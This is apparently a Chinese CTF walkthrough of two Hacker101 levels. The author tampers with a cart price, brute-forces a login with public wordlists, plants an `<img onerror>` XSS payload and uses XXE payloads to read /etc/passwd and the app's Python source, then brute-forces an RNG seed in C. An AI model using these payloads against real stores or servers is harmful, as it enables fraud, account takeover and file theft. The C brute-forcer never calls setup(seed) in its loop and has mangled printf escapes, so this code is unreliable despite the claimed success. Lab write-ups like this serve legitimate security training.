> 原文链接: https://www.anquanke.com//post/id/181018 


# 玩转Hacker101 CTF（四）


                                阅读量   
                                **332791**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">15</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t012536c97c3969cb78.png)](https://p2.ssl.qhimg.com/t012536c97c3969cb78.png)



hi，大家好，我我我又又又来啦！接着[第一篇](https://www.anquanke.com/post/id/180186)、[第二篇](https://www.anquanke.com/post/id/180395)还有[第三篇](https://www.anquanke.com/post/id/180525)的进度，这次为大家带来Hacker101 CTF的第十、十一题：

[![](https://p0.ssl.qhimg.com/t017f37af883ef5b35f.jpg)](https://p0.ssl.qhimg.com/t017f37af883ef5b35f.jpg)

废话不多说，上题！



## 第十题Petshop Pro

这道题比较简单，说简单一下，打开主页：

[![](https://p4.ssl.qhimg.com/t01041d5195a1fdc274.jpg)](https://p4.ssl.qhimg.com/t01041d5195a1fdc274.jpg)

看来是个宠物店，可爱的猫猫和狗狗,可以加入购物车带回家！:）

由于最近比较流行撸羊毛，所以看到这样的购物商店就想撸**^_^**，点个小猫加入购物车，自动跳转到付款页面：

[![](https://p2.ssl.qhimg.com/t018a10f433e1fd3649.jpg)](https://p2.ssl.qhimg.com/t018a10f433e1fd3649.jpg)

在burpsuite中打开抓包开关，点击网页上的“check Out”，把付款包抓下来：

[![](https://p2.ssl.qhimg.com/t01a24c24d689b84401.jpg)](https://p2.ssl.qhimg.com/t01a24c24d689b84401.jpg)

其中post的数据为：<br>`cart=%5B%5B0%2C+%7B%22logo%22%3A+%22kitten.jpg%22%2C+%22price%22%3A+8.95%2C+%22name%22%3A+%22Kitten%22%2C+%22desc%22%3A+%228%5C%22x10%5C%22+color+glossy+photograph+of+a+kitten.%22%7D%5D%5D`<br>
url解码后为:<br>`cart=[[0, `{`"logo": "kitten.jpg", "price": 8.95, "name": "Kitten", "desc": "8"x10" color glossy photograph of a kitten."`}`]]`<br>
可以看到价格等信息都在里面，来当回羊毛党吧，我们将price改为0发送，

[![](https://p1.ssl.qhimg.com/t011a390e8e4a1db45f.jpg)](https://p1.ssl.qhimg.com/t011a390e8e4a1db45f.jpg)

ok，付款值已经变为了0，羊毛撸成功！拿到了第一个flag。

继续，看看有没有敏感路径,爆破一下路径，工具任选，发现有login页面：

[![](https://p1.ssl.qhimg.com/t018fed3e0631870531.jpg)](https://p1.ssl.qhimg.com/t018fed3e0631870531.jpg)

试了一下万能密码、POST注入，均无效，但是发现输入错误的用户名会告知用户名错误，而且没有验证码和次数限制，

[![](https://p3.ssl.qhimg.com/t01dc9529b274c0708a.jpg)](https://p3.ssl.qhimg.com/t01dc9529b274c0708a.jpg)

所以可以先爆破用户名，再爆破密码，先爆破用户名：

[![](https://p0.ssl.qhimg.com/t018bcf7e664064fd94.jpg)](https://p0.ssl.qhimg.com/t018bcf7e664064fd94.jpg)

注意字典去这里找https://github.com/danielmiessler/SecLists，爆破用户名用里面的:SecLists-masterUsernamesNamesnames.txt,爆破密码用SecLists-masterPasswordsdarkweb2017-top10000.txt,别问我怎么知道的，

[![](https://p2.ssl.qhimg.com/t01903e3f6b2c2cf75f.jpg)](https://p2.ssl.qhimg.com/t01903e3f6b2c2cf75f.jpg)

注意这里有个坑，正常的用户名和错误的用户名返回的包长度是一样的，因为”Invalid username”和”Invalie password”长度是一样的，所以看返回包的长度是看不出什么的，除非一个个包去翻ಥ_ಥ ，所以爆破用户名时要加一个结果匹配选项：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017f524f9fadf260bc.jpg)

爆破结果：

[![](https://p5.ssl.qhimg.com/t016c627b9bdb6df8da.gif)](https://p5.ssl.qhimg.com/t016c627b9bdb6df8da.gif)

然后爆破密码：

[![](https://p2.ssl.qhimg.com/t013aaad67358da558c.jpg)](https://p2.ssl.qhimg.com/t013aaad67358da558c.jpg)

[![](https://p2.ssl.qhimg.com/t0104efa3539cb10ba5.gif)](https://p2.ssl.qhimg.com/t0104efa3539cb10ba5.gif)

然后用correy:tuttle登陆：

[![](https://p2.ssl.qhimg.com/t012bc6de1909afb27b.jpg)](https://p2.ssl.qhimg.com/t012bc6de1909afb27b.jpg)

拿到第二个flag，继续，看到页面上有edit链接，点开：

[![](https://p2.ssl.qhimg.com/t010fc36a79d55b73b1.jpg)](https://p2.ssl.qhimg.com/t010fc36a79d55b73b1.jpg)

发现有可以编辑的地方，看能否xss，在name、description处都输入&lt;img src=x onerror=alert(1)&gt;，save保存，回到主页：

[![](https://p2.ssl.qhimg.com/t01bbcddb391c3c7a09.jpg)](https://p2.ssl.qhimg.com/t01bbcddb391c3c7a09.jpg)

虽然payload奏效了，但是没有flag，去其他页面看看，点击checkout，跳转到付款页面：

[![](https://p5.ssl.qhimg.com/t01d3fa47b0f186bc91.jpg)](https://p5.ssl.qhimg.com/t01d3fa47b0f186bc91.jpg)

拿到了第三个flag。



## 第十一题Model E1337 – Rolling Code Lock

这道题比较难，详细说一下，打开主页：

[![](https://p1.ssl.qhimg.com/t013f1a5ab91016aa0e.jpg)](https://p1.ssl.qhimg.com/t013f1a5ab91016aa0e.jpg)

让我们输入code解锁，随便输个1，点Unlock解锁，

[![](https://p3.ssl.qhimg.com/t011c0b3c2c5795e168.jpg)](https://p3.ssl.qhimg.com/t011c0b3c2c5795e168.jpg)

反馈一个期望值09454537,意思是我们刚才如果输入这个值得话就解锁了，那么再回到主页输入09454537,点击Unlock,

[![](https://p3.ssl.qhimg.com/t01134d116259f05120.jpg)](https://p3.ssl.qhimg.com/t01134d116259f05120.jpg)

期望值变了，所以还是没成功，想了一会，没有头绪，试试其他思路吧，先爆破一下路径，工具任选，一下就找到了admin页面，来看一下：

[![](https://p5.ssl.qhimg.com/t019dda03623a2746bf.jpg)](https://p5.ssl.qhimg.com/t019dda03623a2746bf.jpg)

这个admin页面比较奇怪，既没有登陆框也没有任何可供输入的地方，只有一条奇怪的信息：`Lock location:Front door`，抓包也没有看到任何有用的东西，右击看了一下网页源码：

[![](https://p0.ssl.qhimg.com/t013aa57f6e07e0f9e3.jpg)](https://p0.ssl.qhimg.com/t013aa57f6e07e0f9e3.jpg)

有一条比较露骨的注释：

`&lt;!-- We should be using get-config for this on the client side. --&gt;`

所以应该有get-config:

[![](https://p1.ssl.qhimg.com/t018b717e9a4d943751.jpg)](https://p1.ssl.qhimg.com/t018b717e9a4d943751.jpg)

这部就是刚刚admin页面中的信息么，再看一下这个页面的网页源代码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t017a3578f7e503bc91.jpg)

是个XML格式的内容，那么get-config很可能读取了一个XML文件，我们现在将这些线索串起来，推测一下后台的逻辑：当我们访问admin页面时，admin调用了get-config,get-config读取了一个XML文件，获取了其中相关的字段，生成了admin页面。所以这道题很可能考察了XXE注入，我们需要通过XXE注入修改get-config读取的文件，比如说网站源码，但是XXE注入需要注入点啊，在哪里呢？

抓了一下admin页面和get-config的包，用OPTIONS请求探测了一下两个页面，发现两个页面都只支持HEADOPTIONSGET三种请求方法：

[![](https://p5.ssl.qhimg.com/t0155e8e148fd9e3b8c.jpg)](https://p5.ssl.qhimg.com/t0155e8e148fd9e3b8c.jpg)

[![](https://p1.ssl.qhimg.com/t013ae5d2dbfc9e6a3c.jpg)](https://p1.ssl.qhimg.com/t013ae5d2dbfc9e6a3c.jpg)

难道要爆破参数用GET方法发送XXE的payload，或者还有其他页面？我在反反复复测试XXE以及爆破页面的过程中度过了两个日夜，对着get-config页面发呆，最后几乎都要放弃了，忽然灵机一动，既然有get-config，为什么不会有set-config，访问了一下：

[![](https://p2.ssl.qhimg.com/t019f8b87414527dea1.jpg)](https://p2.ssl.qhimg.com/t019f8b87414527dea1.jpg)

居然不是404！，说明这个页面是存在的，只是我们访问它的方式有一些问题，抓包，改请求方法为OPTIONS：

[![](https://p3.ssl.qhimg.com/t01787de4c384ae6dcf.jpg)](https://p3.ssl.qhimg.com/t01787de4c384ae6dcf.jpg)

依然不支持POST，没关系，爆破一下参数，字典用上文提到的字典包，用里面的:SecLists-masterDiscoveryWeb-Contentburp-parameter-names.txt,payload参照get-config返回的内容，修改为:

`&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "/etc/passwd" &gt;]&gt;&lt;config&gt;&lt;location&gt;&amp;xxe;&lt;/location&gt;&lt;/config&gt;`

url编码后添加到参数后面，开始爆破：

[![](https://p1.ssl.qhimg.com/t01b19f192ea293594c.jpg)](https://p1.ssl.qhimg.com/t01b19f192ea293594c.jpg)

很快就爆了出来：

[![](https://p0.ssl.qhimg.com/t01119f5ce88f813438.jpg)](https://p0.ssl.qhimg.com/t01119f5ce88f813438.jpg)

这个包发生了302跳转，猜想这里payload已经奏效，所以回到admin页面，查看网页源码:

[![](https://p1.ssl.qhimg.com/t012c5eb9f6f208902e.jpg)](https://p1.ssl.qhimg.com/t012c5eb9f6f208902e.jpg)

完美！接下来就是读取网站后台源码了，由于这里是uwsgi+flask+nginx+docker环境(看的hint)，所以先用payload：

`&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "uwsgi.ini" &gt;]&gt;&lt;config&gt;&lt;location&gt;&amp;xxe;&lt;/location&gt;&lt;/config&gt;`

读取uwsig.ini,里面内容很简单：

```
module = main
callable = app
```

说明主模块为main.py,所以下一步用payload：

`&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "main.py" &gt;]&gt;&lt;config&gt;&lt;location&gt;&amp;xxe;&lt;/location&gt;&lt;/config&gt;`

读取main.py,这是网站的主页逻辑：

```
from flask import Flask, abort, redirect, request, Response, session
from jinja2 import Template
import base64, json, os, random, re, subprocess, time, xml.sax
from cStringIO import StringIO

from rng import *

# ^FLAG^7682cc1c5a112610b3cc9b7b87e0661223834323a2da73c0ee966eed510b6b49$FLAG$

flags = json.loads(os.getenv('FLAGS'))
os.unsetenv('FLAGS')

app = Flask(__name__)

templateCache = `{``}`
def render(tpl, **kwargs):
    if tpl not in templateCache:
        templateCache[tpl] = Template(file('templates/%s.html' % tpl).read())
    return templateCache[tpl].render(**kwargs)

@app.after_request
def add_header(r):
    r.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    r.headers["Pragma"] = "no-cache"
    r.headers["Expires"] = "0"
    r.headers['Cache-Control'] = 'public, max-age=0'
    return r

@app.route('/')
def index():
    return render('home')

@app.route('/unlock', methods=['POST'])
def unlock():
    code = int(request.form['code'])
    cur = next(26)
    time.sleep(5)

    if code == cur:
        return 'Unlocked successfully.  Flag: ' + flags[1]
    else:
        return 'Code incorrect.  Expected %08i' % cur

@app.route('/admin')
def admin():
    return render('admin', location=location)

location = 'Front door'

@app.route('/get-config')
def getConfig():
    return '&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;config&gt;&lt;location&gt;%s&lt;/location&gt;&lt;/config&gt;' % location

class Handler(xml.sax.ContentHandler):
    def __init__(self):
        self.location = None
    def startElement(self, name, attrs):
        if name == 'location':
            self.location = ''
    def endElement(self, name):
        if name == 'location':
            global location
            location = self.location
            self.location = None
    def characters(self, content):
        if self.location is not None:
            self.location += content

@app.route('/set-config')
def setConfig():
    data = request.args['data']
    parser = xml.sax.make_parser()
    parser.setContentHandler(Handler())
    parser.parse(StringIO(data))
    return redirect('admin')

app.run(host='0.0.0.0', port=80)
```

看！里面有flag，继续，阅读上面的源码，注意其中的unlock函数，实现首页的猜数字功能，我们要猜的期望值是由next(26)产生的，而next函数不在该页面中，看了一下第六行`from rng import *`,所以这里应该还有个rng.py,next函数应该就在其中，于是用payload:

`&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "rng.py" &gt;]&gt;&lt;config&gt;&lt;location&gt;&amp;xxe;&lt;/location&gt;&lt;/config&gt;`

读取rng.py,源码如下：

```
def setup(seed):
    global state
    state = 0
    for i in xrange(16):
        cur = seed &amp; 3
        seed &gt;&gt;= 2
        state = (state &lt;&lt; 4) | ((state &amp; 3) ^ cur)
        state |= cur &lt;&lt; 2

def next(bits):
    global state

    ret = 0
    for i in xrange(bits):
        ret &lt;&lt;= 1
        ret |= state &amp; 1
        state = (state &lt;&lt; 1) ^ (state &gt;&gt; 61)
        state &amp;= 0xFFFFFFFFFFFFFFFF
        state ^= 0xFFFFFFFFFFFFFFFF

        for j in xrange(0, 64, 4):
            cur = (state &gt;&gt; j) &amp; 0xF
            cur = (cur &gt;&gt; 3) | ((cur &gt;&gt; 2) &amp; 2) | ((cur &lt;&lt; 3) &amp; 8) | ((cur &lt;&lt; 2) &amp; 4)
            state ^= cur &lt;&lt; j

    return ret

setup((random.randrange(0x10000) &lt;&lt; 16) | random.randrange(0x10000))
```

好吧，貌似有点复杂，读了几遍，大意明白了：先用一个2的32次方以内的seed值放入setup函数，生成state的初始值，然后主页接受到浏览器发送过来的code时就进入next函数，生成一个2**26以内的期望值，然后主页逻辑会将code与这个期望值比较，相等就能拿到第二个flag，关键这里state的状态变化太复杂了，实在看不出有啥破绽 (“▔□▔)/(“▔□▔)/，只好祭出暴力破解大法来爆破seed，使之满足计算出的第一个期望值与第二个期望值，注意这里爆破的seed范围为2的32次方，用python会非常慢，用C爆破效率高出许多：

```
#include &lt;stdio.h&gt;

unsigned long long state = 0;
unsigned long long expected_code1 = 12350614;
unsigned long long expected_code2 = 37524982;

void setup(unsigned int seed)`{`
    state = 0;
    unsigned long long cur = 0ll;
    for(unsigned i=0;i&lt;16;i++)`{`
        cur = seed &amp; 3;
        seed &gt;&gt;= 2;
        state = (state &lt;&lt; 4)|((state &amp; 3ll) ^ cur);
        state |= cur &lt;&lt; 2;
    `}`
`}`

unsigned long long next(unsigned int bits)`{`
    unsigned long long ret = 0l;
    for(unsigned int i=0;i&lt;26;i++)`{`
        ret &lt;&lt;= 1;
        ret |= (state &amp; 1ll);
        state = (state &lt;&lt; 1) ^ (state &gt;&gt; 61);
        state &amp;= 0xFFFFFFFFFFFFFFFFll;
        state ^= 0xFFFFFFFFFFFFFFFFll;

        for(unsigned int j=0;j&lt;64;j+=4)`{`
            unsigned long long cur = 0ll;
            cur = (state &gt;&gt; j) &amp; 0xFll;
            cur = (cur &gt;&gt; 3) | ((cur &gt;&gt; 2)&amp;2ll) | ((cur&lt;&lt;3)&amp;8ll) | ((cur&lt;&lt;2)&amp;4ll);
            state ^= (cur &lt;&lt; j);
        `}`
    `}`
    return ret;
`}`

int main(int argc,char *argv[])`{`
    unsigned int seed = 1;

    while(seed)`{`
        if(next(26) == expected_code1)`{`
            printf("first check passed,and seed is:%ldn",seed);
            if(next(26) == expected_code2)`{`
                printf("second check passed,and seed is:%ldn",seed);
                printf("and next expected_code is ：%ldn",next(26));
                break;
            `}`
        `}`
        seed++;
    `}`
    printf("end");
    while(getchar()!='+')`{``}`
`}`
```

将第一个与第二个期望值代入上面的代码，爆破之，得到第三个期望值，回到主页面输入，验证通过，得到第二个flag：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016cc8cff8ff202959.jpg)

打完收工！
